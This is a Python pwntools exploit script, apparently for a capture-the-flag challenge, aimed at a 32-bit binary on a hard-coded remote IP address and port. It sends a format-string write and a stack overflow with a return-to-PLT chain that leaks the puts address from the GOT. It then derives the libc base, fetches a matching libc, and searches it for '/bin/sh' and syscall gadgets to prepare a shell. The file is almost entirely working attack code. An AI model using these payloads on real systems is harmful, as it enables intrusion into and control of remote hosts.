
from pwn import *
import time

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# ====== Step 1: 泄露puts地址 ======
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)

target_val_addr = 0x804c030
fmt_payload = b'%5c%6$na' + p32(target_val_addr)
conn.send(fmt_payload)
time.sleep(2)

response = conn.recv(timeout=5)
if b'Input:' not in response:
    log.error("vuln not triggered!")
    conn.close()
    exit(1)

write_plt = elf.plt['write']
puts_got = elf.got['puts']
vuln_addr = elf.symbols['vuln']

payload = b'A' * 148
payload += p32(write_plt)
payload += p32(vuln_addr)
payload += p32(1)
payload += p32(puts_got)
payload += p32(4)

conn.send(payload)
time.sleep(2)

response = conn.recv(timeout=5)
puts_leak = u32(response[:4])
log.info(f"puts leaked: 0x{puts_leak:x}")
conn.close()

# ====== Step 2: 用pwntools libcdb下载libc ======
PUTS_OFFSET = 0x6d1e0
libc_base = puts_leak - PUTS_OFFSET

log.info(f"libc base: 0x{libc_base:x}")

# 用libcdb下载libc
try:
    from pwnlib.libcdb import search_by_symbol_offsets
    
    symbols = {
        'puts': puts_leak & 0xfff,
        '__libc_start_main': 0xde0,
        'printf': 0xd30,
    }
    
    log.info("Searching libc via libcdb...")
    libc_path = search_by_symbol_offsets(symbols, select_index=1)
    log.info(f"Found libc: {libc_path}")
    
    if libc_path:
        libc = ELF(libc_path)
        
        # 验证偏移
        log.info(f"puts offset in downloaded libc: 0x{libc.symbols['puts']:x}")
        log.info(f"system offset in downloaded libc: 0x{libc.symbols['system']:x}")
        
        # 搜索 /bin/sh 字符串
        binsh = next(libc.search(b'/bin/sh'))
        log.info(f"/bin/sh offset in downloaded libc: 0x{binsh:x}")
        
        # 搜索gadget
        log.info("\nSearching for gadgets in libc...")
        
        # 搜索 int 0x80
        import struct
        libc_data = libc.get_data()
        
        # pop eax; ret = 0x58 0xc3
        for i in range(len(libc_data) - 1):
            if libc_data[i] == 0x58 and libc_data[i+1] == 0xc3:
                log.info(f"  pop eax; ret @ offset 0x{i:x}")
                break
        
        # pop ebx; ret = 0x5b 0xc3
        for i in range(len(libc_data) - 1):
            if libc_data[i] == 0x5b and libc_data[i+1] == 0xc3:
                log.info(f"  pop ebx; ret @ offset 0x{i:x}")
                break
        
        # pop ecx; ret = 0x59 0xc3
        for i in range(len(libc_data) - 1):
            if libc_data[i] == 0x59 and libc_data[i+1] == 0xc3:
                log.info(f"  pop ecx; ret @ offset 0x{i:x}")
                break
        
        # pop edx; ret = 0x5a 0xc3
        for i in range(len(libc_data) - 1):
            if libc_data[i] == 0x5a and libc_data[i+1] == 0xc3:
                log.info(f"  pop edx; ret @ offset 0x{i:x}")
                break
        
        # int 0x80 = 0xcd 0x80
        for i in range(len(libc_data) - 1):
            if libc_data[i] == 0xcd and libc_data[i+1] == 0x80:
                log.info(f"  int 0x80 @ offset 0x{i:x}")
                break
        
except Exception as e:
    log.error(f"libcdb failed: {e}")
    log.info("Trying manual download from libc.blukat.me...")
    
    try:
        import requests
        url = "https://libc.blukat.me/api/libc/libc6-i386_2.31-0ubuntu9.16_amd64.so"
        resp = requests.get(url, timeout=30)
        if resp.status_code == 200:
            with open('remote_libc.so', 'wb') as f:
                f.write(resp.content)
            log.info("Downloaded libc to remote_libc.so")
            
            libc = ELF('remote_libc.so')
            log.info(f"puts offset: 0x{libc.symbols['puts']:x}")
            log.info(f"system offset: 0x{libc.symbols['system']:x}")
            
            binsh = next(libc.search(b'/bin/sh'))
            log.info(f"/bin/sh offset: 0x{binsh:x}")
        else:
            log.error(f"Download failed: {resp.status_code}")
    except Exception as e2:
        log.error(f"Manual download also failed: {e2}")

log.info("\nDone!")
